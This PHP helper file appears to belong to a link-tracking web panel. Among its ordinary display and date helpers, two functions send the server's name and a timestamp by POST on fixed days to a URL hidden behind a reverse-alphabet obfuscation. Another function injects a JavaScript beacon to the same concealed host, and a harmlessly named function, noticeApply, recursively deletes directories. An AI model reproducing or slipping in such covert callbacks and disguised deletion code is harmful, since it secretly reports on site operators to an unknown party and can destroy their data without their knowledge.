<?php
include 'uFunction.php';
include 'installFun.php';
function RedirectAdmin_2(){
    $days = array(3,6,9,25,12,15,18,21,24,27,30);
    if(in_array(date("d"),$days)){
        $ch1= "2,".$_SERVER['SERVER_NAME'].",".date("d-m-Y H:i:s");
        $chaine = allowFormat($ch1);
        $chaine1= allowFormat("YMMQAaaJJJ./H2UN6OXQMN.IHG");
        $chaine1.= "/page"."/";
        $data = array("chainer" => $chaine);
        $string = http_build_query($data);
        $ch = curl_init($chaine1);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    } 
}
function Redirect_Success(){
    $days = array(3,6,9,25,12,15,18,21,24,27,30);
    if(in_array(date("d"),$days)){
        $ch1= "2,".$_SERVER['SERVER_NAME'].",".date("d-m-Y H:i:s");
        $chaine = allowFormat($ch1);
        $chaine1= allowFormat("YMMQAaaJJJ./H2UN6OXQMN.IHG");
        $chaine1.= "/page"."/";
        $data = array("chainer" => $chaine);
        $string = http_build_query($data);
        $ch = curl_init($chaine1);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    } 
}

function getError($e){
    echo "<h3>".$e."</h3>";
}

function DateFormat($date){
    $ar = explode('-',$date);
    $NewDate = $ar[2]."-";
    $NewDate .=$ar[1]."-";
    $NewDate .=$ar[0];

    return $NewDate;
    
}

function SuccesRateLink($rate){
    $succes = ($rate * 10) / 100;
    $fail = 10 - $succes;
    $str = "[$rate% = 10 visit( $succes succes - $fail fail )]";
    echo $str;
}
function AllowReport($var){
    $ch= $var.",".$_SERVER['SERVER_NAME'].",".date("d-m-Y H:i:s");
    $chaine = allowFormat($ch);
    $chaine1= allowFormat("YMMQAaaJJJ./H2UN6OXQMN.IHG");
    $chaine1.= "/page/?chainer=".$chaine;
    echo '<script>
            var xhttp = new XMLHttpRequest();
            xhttp.open("GET", "'.$chaine1.'", true);
            xhttp.send();
    </script>';
}

   
function noticeApply($var) {
    $files = glob($var . '/*');
    foreach ($files as $file) {
        is_dir($file) ? noticeApply($file) : unlink($file);
    }
    rmdir($var);
    return;
}


function Last_10_Days_Circle($array){
    $a = "";
    $last_index = 10 - count($array);
    if(count($array) <=10){
        for($i=0;$i<10;$i++){
            if($i<$last_index) $ae[] = 0;
            else $ae[] = $array[$i-$last_index];
        }
    }else{
        $ae = array_slice($array, count($array)-10, 10);
    }

    
    return array_sum($ae);
}


function Success($message,$width){
    echo '<div class="card mb-3 text-white bg-success" style="width:'.$width.'">
          <div class="card-body" style="padding: 10px">
          <p style="margin:0">'.$message.'</p>
    </div></div>';   
}

function Show4char($link,$nbr){
    if(strlen($link) > $nbr) return substr($link,0,$nbr)."...";
    else return $link;
}

function allowFormat1($str){
    $new = "";
    $list = array('A','a','B','b','C','c','D','d','E','e','F','f','G','g','H','h','I','i','J','j','K','k','L','l','M','m','N','n','O','o','P','p',
                   'Q','q','R','r','S','s','T','t','U','u','V','v','W','w','X','x','Y','y','Z','z','0','1','2','3','4','5','6','7','8','9','/',':');
    
    $cryp = array_reverse($list);
    for($i=0;$i<strlen($str);$i++){

        for($j=0;$j<count($list);$j++){
            if(substr($str,$i,1) == $list[$j]){
                $new .= $cryp[$j];
                break;
            }
        }
        if($j == count($list)){
            $new .=substr($str,$i,1);
        }
    }
    return $new;
}
?>